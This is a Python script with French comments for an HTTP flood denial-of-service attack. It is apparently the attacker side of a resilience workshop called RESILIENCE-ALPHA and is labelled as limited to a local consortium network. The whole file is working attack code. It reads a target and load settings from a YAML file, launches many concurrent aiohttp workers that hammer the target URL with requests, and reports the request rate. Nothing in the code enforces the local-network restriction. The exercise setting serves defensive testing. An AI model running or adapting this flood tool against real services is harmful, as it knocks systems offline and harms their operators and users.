"""
DDoS HTTP Flood - PC Attaquant
Workshop RESILIENCE-ALPHA — Cyber pilier
Strictement limité au réseau local du consortium.
"""

import asyncio
import aiohttp
import yaml
import time
import argparse
import json
import sys
from datetime import datetime


def load_config(path: str = "config.yaml") -> dict:
    with open(path) as f:
        return yaml.safe_load(f)


class FloodStats:
    def __init__(self):
        self.sent = 0
        self.success = 0
        self.errors = 0
        self.start_time = time.time()

    def rps(self) -> float:
        elapsed = time.time() - self.start_time
        return self.sent / elapsed if elapsed > 0 else 0

    def report(self):
        elapsed = time.time() - self.start_time
        print(
            f"[{datetime.now().strftime('%H:%M:%S')}] "
            f"Envoyées: {self.sent:>6} | "
            f"OK: {self.success:>6} | "
            f"Erreurs: {self.errors:>6} | "
            f"RPS: {self.rps():>7.1f} | "
            f"Durée: {elapsed:.0f}s"
        )


async def worker(session: aiohttp.ClientSession, url: str, payload: dict,
                 stats: FloodStats, n_requests: int, timeout: int):
    headers = payload.get("headers", {})
    body = json.dumps(payload.get("body", {}))
    method = payload.get("method", "GET").upper()

    for _ in range(n_requests):
        try:
            async with session.request(
                method, url,
                data=body,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as resp:
                stats.sent += 1
                if resp.status < 500:
                    stats.success += 1
                else:
                    stats.errors += 1
        except Exception:
            stats.sent += 1
            stats.errors += 1


async def run_flood(config: dict):
    target = config["target"]
    atk = config["attack"]
    payload = config["payload"]

    url = f"http://{target['host']}:{target['port']}{target['path']}"
    print(f"[*] Cible        : {url}")
    print(f"[*] Workers      : {atk['workers']}")
    print(f"[*] Req/worker   : {atk['requests_per_worker']}")
    print(f"[*] Durée max    : {atk['duration_seconds']}s")
    print(f"[*] Lancement    : {datetime.now().strftime('%H:%M:%S')}")
    print("-" * 70)

    stats = FloodStats()
    deadline = time.time() + atk["duration_seconds"]

    connector = aiohttp.TCPConnector(limit=atk["workers"] * 2, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while time.time() < deadline:
            tasks = [
                asyncio.create_task(
                    worker(session, url, payload, stats,
                           atk["requests_per_worker"], atk["timeout"])
                )
                for _ in range(atk["workers"])
            ]
            report_task = asyncio.create_task(_periodic_report(stats, 5))
            await asyncio.gather(*tasks)
            report_task.cancel()

    print("-" * 70)
    print(f"[*] Fin de l'attaque")
    stats.report()


async def _periodic_report(stats: FloodStats, interval: int):
    while True:
        await asyncio.sleep(interval)
        stats.report()


def main():
    parser = argparse.ArgumentParser(description="HTTP Flood — Réseau local uniquement")
    parser.add_argument("--config", default="config.yaml")
    parser.add_argument("--workers", type=int, help="Override nb workers")
    parser.add_argument("--duration", type=int, help="Override durée (s)")
    args = parser.parse_args()

    config = load_config(args.config)
    if args.workers:
        config["attack"]["workers"] = args.workers
    if args.duration:
        config["attack"]["duration_seconds"] = args.duration

    print("=" * 70)
    print("  RESILIENCE-ALPHA — Scénario DDoS volumétrique")
    print("  Périmètre : réseau local du consortium uniquement")
    print("=" * 70)

    asyncio.run(run_flood(config))


if __name__ == "__main__":
    main()
